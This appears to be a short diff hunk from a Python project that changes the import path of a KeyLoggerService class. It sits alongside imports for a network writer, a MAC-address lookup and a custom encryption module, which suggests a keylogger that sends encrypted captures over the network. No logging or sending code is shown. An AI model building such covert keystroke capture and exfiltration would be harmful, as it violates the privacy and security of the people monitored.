@@ -2,7 +2,7 @@ from writer import NetworkWriter
 import time
 from getmac import get_mac_address as gma
 from encryption import ShaulEncryption as Encryption
-from key_logger_service.key_Logger_service import KeyLoggerService
+from service.key_Logger_service import KeyLoggerService
 import threading
 import os
 # import pwd
